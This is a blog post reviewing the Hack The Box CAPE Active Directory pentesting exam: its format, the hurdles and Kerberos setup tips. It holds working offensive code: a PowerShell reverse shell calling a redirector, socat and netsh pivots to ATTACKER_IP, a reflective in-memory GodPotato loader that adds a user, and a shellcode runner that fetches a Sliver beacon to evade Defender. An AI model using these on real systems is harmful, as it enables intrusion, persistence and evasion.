---
title: "HTB CAPE — Exam Review"
description: "A spoiler-free review of the HTB Certified Active Directory Pentesting Expert exam — what the ten-day window actually feels like, the hurdles that cost me the most time, and the redirector, reverse-shell and Kerberos tradecraft I leaned on from start to finish."
pageIcon: "https://static.hackthebox.com/academy/badges/ce43a59d097ba2a96ea9617d47bc7eeb/logo.png"
---

<a href="https://academy.hackthebox.com/achievement/badge/c4bd85a5-b5f0-11f1-82d1-bea50ffe6cb4" style="display:block;max-width:560px;margin:1.5rem auto;text-decoration:none;border-radius:14px;overflow:hidden;box-shadow:0 10px 40px rgba(0,0,0,.45);font-family:system-ui,-apple-system,sans-serif;">
  <div style="height:104px;background:#141D2B url('https://labs.hackthebox.com/images/achievementBG.png') center/cover;position:relative;">
    <img src="https://static.hackthebox.com/academy/badges/ce43a59d097ba2a96ea9617d47bc7eeb/logo.png" alt="HTB Certified Active Directory Pentesting Expert badge" width="88" height="88" style="position:absolute;left:50%;bottom:-44px;transform:translateX(-50%);border-radius:50%;background:#1A2332;box-shadow:0 0 0 4px #1A2332;" />
  </div>
  <div style="background:#1A2332;padding:58px 20px 22px;text-align:center;">
    <div style="color:#fff;font-size:1.15rem;font-weight:600;line-height:1.35;">HTB Certified Active Directory<br />Pentesting Expert</div>
    <div style="height:1px;margin:14px auto;max-width:240px;background:linear-gradient(to right,transparent,#9FEF00,transparent);"></div>
    <div style="color:#A4B1CD;font-size:.9rem;"><span style="color:#fff;">vishnupunati</span> earned this badge</div>
    <div style="display:flex;justify-content:center;margin-top:20px;">
      <div style="flex:1;padding:4px;"><div style="color:#9FEF00;font-weight:700;letter-spacing:1px;">CAPE</div><div style="color:#A4B1CD;font-size:.62rem;letter-spacing:1px;margin-top:2px;">CERTIFICATION</div></div>
      <div style="flex:1;padding:4px;border-left:1px solid #111927;border-right:1px solid #111927;"><div style="color:#9FEF00;font-weight:700;letter-spacing:1px;">21 Sep 2026</div><div style="color:#A4B1CD;font-size:.62rem;letter-spacing:1px;margin-top:2px;">ISSUED</div></div>
      <div style="flex:1;padding:4px;"><div style="color:#9FEF00;font-weight:700;letter-spacing:1px;">EXPERT</div><div style="color:#A4B1CD;font-size:.62rem;letter-spacing:1px;margin-top:2px;">LEVEL</div></div>
    </div>
    <div style="color:#64748B;font-size:.58rem;letter-spacing:.6px;margin-top:16px;">CREDENTIAL ID · C4BD85A5-B5F0-11F1-82D1-BEA50FFE6CB4</div>
  </div>
</a>

**HTB CAPE** — *Certified Active Directory Pentesting Expert* — is Hack The Box's
expert-level Active Directory certification. You are dropped into a full AD
estate with an engagement letter and an internal foothold, no credentials and no
hand-holding, and you have ten days to collect enough flags and write the report
that goes with them. This is my review of that experience: what the exam asks
for, where it hurt, and the supporting tradecraft that did most of the quiet
work in the background.

:::caution[Spoiler-free]
Nothing on this page describes the exam environment. No hosts, domains,
accounts, services, flags or attack paths — not even in disguise. Every command
below is generic tradecraft with placeholders, the same as you would use in any
lab, and every example value is invented. If you are looking for hints about the
box, there are deliberately none here.
:::

## Exam format

| | |
| --- | --- |
| **Window** | 10 days |
| **Goal** | 90 points, earned by submitting flags |
| **Deliverable** | A professional pentest report on HTB's supplied template |
| **Starting position** | Engagement letter plus an internal foothold — no credentials |
| **Preparation** | The *Active Directory Penetration Tester* job-role path (15 modules) |

Format details are HTB's own, from the [CAPE exam page](https://www.hackthebox.com/blog/htb-cape-exam-explained-pentest-job-role-path-certification) at the time of writing.

Two things about that table are worth sitting with before you book an attempt.
The first is that points and report are **not** independent: the report is the
deliverable the certification is actually named after, and a strong set of flags
with a weak write-up is not a pass. The second is that ten days sounds generous
and is not. It is ten days of *your* life — work, sleep and everything else
included — and the environment will happily absorb a full day of enumeration
that ends nowhere.

## What it actually tests

Less than you would think about knowing exotic attacks, and much more about
**operating an estate you do not understand yet**. The technical primitives are
the ones already covered in the job-role path and any decent multi-domain Pro
Lab — delegation, ACL abuse, certificate services, trusts, SQL, credential
material lying where it should not. What CAPE grades is whether you can hold all
of that in your head at once: keep an accurate map of who can do what to whom,
notice that a right you enumerated on day two matters on day six, and get your
traffic in and out of segments that were never designed to talk to your machine.

It also quietly tests stamina. The path is long. Every step you take extends the
chain of tunnels, tickets and redirectors you have to keep working, and a
mistake made early is usually found late.

## The hurdles

### Enumeration that looks complete and is not

The single biggest time sink was believing an enumeration pass had finished when
it had not. Collection over one protocol, from one host, as one identity gives
you a *view*, not the truth. The habit worth building before the exam is
re-collecting after every identity change and diffing against what you had
before — the new edges are the whole game.

### Routing is a first-class problem

Assume nothing can reach you. In a segmented estate, the host you land on is
frequently the only thing that can see both your machine and the next hop, and
every later segment needs the chain extended by one more link. I lost hours
early on to a payload that was technically perfect and simply could not call
home. Build the plumbing first, prove it with something trivial, then start
firing.

### Kerberos punishes sloppiness

Almost everything interesting later on is Kerberos rather than NTLM, and
Kerberos cares about names in a way NTLM never did. Wrong FQDN, unresolvable
host, skewed clock, stale ticket — each one fails in a way that looks like the
attack is wrong rather than the plumbing. More on this below, because it is
where most of my dead ends actually came from.

### Note-taking debt compounds

By the middle of the window I had more credential material, tickets and
half-finished leads than I could hold. Anything not written down at the moment
it was discovered was effectively lost, and re-discovering it cost multiples of
what recording it would have. Screenshot as you go, with the command visible in
the frame — you will be writing the report from those screenshots, and a
beautiful result with no evidence behind it is not reportable.

### The report is its own exam

Writing up an engagement of this size is a serious piece of work in itself. The
template is long, the findings need severity and CVSS reasoning, and the
walkthrough has to be reproducible by someone who was not there. Budget real
days for it, not an evening, and write sections as you finish them rather than
leaving a wall of it for the end.

## Tradecraft that carried me

None of this is exam-specific. It is the supporting kit I reached for constantly
across labs and the exam alike, and having it ready as muscle memory saved far
more time than any single clever attack.

### A repeatable PowerShell reverse shell

Rather than retyping PowerShell into whatever execution primitive I had — a SQL
command shell, a scheduled task, a logon script — I generated one payload with a
short Python one-liner. `powershell.exe -EncodedCommand` expects **UTF-16LE**
base64, which is exactly what trips people up when they base64 a command by
hand:

```bash title="Generate the -EncodedCommand blob"
python3 -c "
import base64
cmd = '\$T=New-Object Net.Sockets.TCPClient(\'REDIRECTOR_IP\',8080);\$N=\$T.GetStream();\$W=New-Object IO.StreamWriter(\$N);function W(\$S){[byte[]]\$script:B=0..\$T.ReceiveBufferSize|%{0};\$W.Write(\$S+\'SHELL> \');\$W.Flush()};W \'\';while((\$R=\$N.Read(\$B,0,\$B.Length)) -gt 0){\$C=([text.encoding]::UTF8).GetString(\$B,0,\$R-1);\$O=try{iex \$C 2>&1|Out-String}catch{\$_|Out-String};W \$O};\$W.Close()'
print(base64.b64encode(cmd.encode('utf-16-le')).decode())
"
```

```text title="Run it on the target"
powershell -noni -ep bypass -nop -enc <base64 payload>
```

The shell writes a `SHELL> ` prompt back over the socket, so a plain `nc -lvnp`
listener behaves like an interactive session instead of a silent pipe.

:::note[Point it at the redirector, not at yourself]
The address baked into the payload should be whatever the *target* can reach —
usually your foothold host or a pivot further in — not your own machine. Getting
this wrong is the most common reason a "working" payload never calls back.
:::

### socat redirectors on the foothold host

One host that can see both worlds becomes the switchboard. A handful of
listeners, one per channel, and everything else is unchanged:

```bash title="Redirectors on the jump host"
sudo socat TCP-LISTEN:443,fork,reuseaddr,ip-transparent TCP:ATTACKER_IP:443 &
sudo socat TCP-LISTEN:445,fork,reuseaddr,ip-transparent TCP:ATTACKER_IP:445 &
sudo socat TCP-LISTEN:8080,fork,reuseaddr,ip-transparent TCP:ATTACKER_IP:8080 &
sudo socat TCP-LISTEN:5555,fork,reuseaddr,ip-transparent TCP:ATTACKER_IP:5555 &
sudo socat TCP-LISTEN:9999,fork,reuseaddr,ip-transparent TCP:ATTACKER_IP:9999 &
```

I keep one port per purpose — C2, SMB for captured authentication, the reverse
shell above, an HTTP payload host, and a tunnelling agent's callback — so a
listener dying tells me immediately which channel is broken. `fork` gives each
connection its own process, `reuseaddr` lets a listener be restarted without
waiting out `TIME_WAIT`, and **`ip-transparent` preserves the original source
address**, which matters the moment relaying is involved: the relayed
authentication has to look like it came from the victim, not from the
redirector.

### netsh portproxy to extend the chain inward

Deeper segments often cannot reach the foothold host either, but they can reach
something you have already taken. Windows' built-in port proxy turns that host
into the next redirector without uploading anything:

```powershell title="Extend the chain from a compromised Windows host"
netsh interface portproxy add v4tov4 listenport=8443 listenaddress=0.0.0.0 connectport=443 connectaddress=REDIRECTOR_IP
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=8080 connectaddress=REDIRECTOR_IP
netsh interface portproxy show all
```

Two habits go with it. **Do not reuse a port the host already serves** — pick
`8443` rather than `443` on anything running a web service, or you break a
production listener to save yourself a digit. And **write the rule down the
moment you add it**: it is a change to the client's estate, it belongs in the
cleanup appendix of your report, and it comes out with `netsh interface
portproxy reset`.

### Windows AMSI Bypass

To execute sharptools on a compromised windows session when defender was enabled you can try loading the assembly file into the powershell memory and execute it without the file ever touching the local file system and get blocked by windows defender.

For example to execute the `GodPotato` on the remote windows machine, start a http server on your machine and execute as following in a powershell session

```powershell reflective loading
$bytes = (Invoke-WebRequest -Uri "http://<your-ip>:<port>/GodPotato-Net35.exe" -UseBasicParsing).Content

$asm = [System.Reflection.Assembly]::Load($bytes)

$asm.EntryPoint.Invoke($null, @(,[string[]]@('-cmd', 'net user jellibean P@ssw0rd123! /add')))

```

The same way to get a sliver beacon from the windows machine, first generate a beacon in a shellcode format as

```sliver shell
generate beacon --mtls <redirector>:<port> --format shellcode --os windows --save <output_name>
```

And then reflectively load the shellcode as the following in a powershell session on the remote host

```powershell reflective loading
$bytes = (Invoke-WebRequest -Uri "http://<attacker-ip>:<port>/shelcode" -UseBasicParsing).Content

[Byte[]]$buf = $bytes

$k = Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);' -Name K -Namespace W -PassThru

$m = $k::VirtualAlloc(0,$buf.Length,0x3000,0x40)

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $m, $buf.Length)

$k::CreateThread(0,0,$m,0,0,0)

```

### Kerberos caveats

This is the section I wish I had written for myself before starting.

**Names must resolve, and must be fully qualified.** Kerberos validates the SPN
against the name you connected to, so tools need FQDNs — and those FQDNs need to
resolve from your host, which over a tunnel usually means doing it yourself:

```text title="/etc/hosts"
10.0.0.10    DC01 DC01.CORP.EXAMPLE.LOCAL CORP.EXAMPLE.LOCAL
10.0.0.20    SRV01 SRV01.CORP.EXAMPLE.LOCAL
10.1.0.10    DC02 DC02.CHILD.EXAMPLE.LOCAL CHILD.EXAMPLE.LOCAL
```

**Declare every realm, and turn discovery off.** Automatic realm/KDC discovery
depends on DNS records you probably cannot reach, and it fails confusingly
rather than loudly:

```text title="/etc/krb5.conf"
[libdefaults]
default_realm = CORP.EXAMPLE.LOCAL
dns_lookup_realm = false
dns_lookup_kdc = false

[realms]
CORP.EXAMPLE.LOCAL = {
    kdc = 10.0.0.10
    admin_server = 10.0.0.10
}
CHILD.EXAMPLE.LOCAL = {
    kdc = 10.1.0.10
    admin_server = 10.1.0.10
}

[domain_realm]
.corp.example.local = CORP.EXAMPLE.LOCAL
corp.example.local = CORP.EXAMPLE.LOCAL
.child.example.local = CHILD.EXAMPLE.LOCAL
child.example.local = CHILD.EXAMPLE.LOCAL
```

**Tell every tool exactly where to go.** With discovery disabled, the extended
options stop being optional. Impacket wants both `-dc-ip` (which KDC to talk to)
and `-dc-host` (the name the SPN is built from — fully qualified); collectors
want the name server and the controller's FQDN spelled out, and `--dns-tcp`
because UDP resolution over a tunnel is unreliable:

```bash title="Explicit targeting"
export KRB5CCNAME=user.ccache
getTGT.py -dc-ip 10.0.0.10 corp.example.local/user:'Password123'

GetUserSPNs.py -k -no-pass -dc-ip 10.0.0.10 -dc-host DC01.CORP.EXAMPLE.LOCAL corp.example.local/user

bloodhound-python -u user -p 'Password123' -d corp.example.local \
  -dc DC01.corp.example.local -ns 10.0.0.10 --dns-tcp -c All
```

**A ticket is a snapshot.** Group membership is baked in at issue time, so after
*every* group change you need a fresh TGT before the new rights do anything.
Reusing the old ticket fails with access denied and looks exactly like the
attack not working.

**Watch the clock.** Skew beyond the tolerance kills authentication outright;
sync against the DC before you start debugging anything more interesting.

:::caution[Client platform]
`evil-winrm`'s Kerberos support was unreliable for me on macOS — the same
tickets worked immediately from a Linux host. If a WinRM session refuses a
ticket that everything else accepts, try another client machine before assuming
the ticket is wrong.
:::

## Takeaways

- **Build the plumbing before the payload.** Redirectors and port proxies first,
  proven with something trivial; then attack. Every hour spent here is repaid
  several times over once the chain is three segments deep.
- **Re-enumerate after every identity change.** The edge that matters is almost
  never visible from where you started, and the diff between two collections is
  more useful than either one on its own.
- **Kerberos failures are usually plumbing failures.** FQDNs, hosts file,
  realms, clock, ticket age. Check those five before you doubt the technique.
- **Record changes as you make them.** Portproxy rules, added group memberships,
  dropped files — the cleanup appendix writes itself if you keep the list from
  day one, and is miserable to reconstruct afterwards.
- **Screenshot the command, not just the result.** You are building the evidence
  base for a report you will write days later, under time pressure.
- **Treat the report as half the exam, because it is.** Start it early, write
  sections as they complete, and give the walkthrough enough detail that a
  stranger could reproduce it.

CAPE is a fair exam and a genuinely hard one. Nothing in it is unreasonable, but
it does not let you skip the unglamorous parts — the enumeration discipline, the
tunnelling, the note-taking, the writing. Come in with those already solved and
you get to spend your ten days on the interesting problem instead.
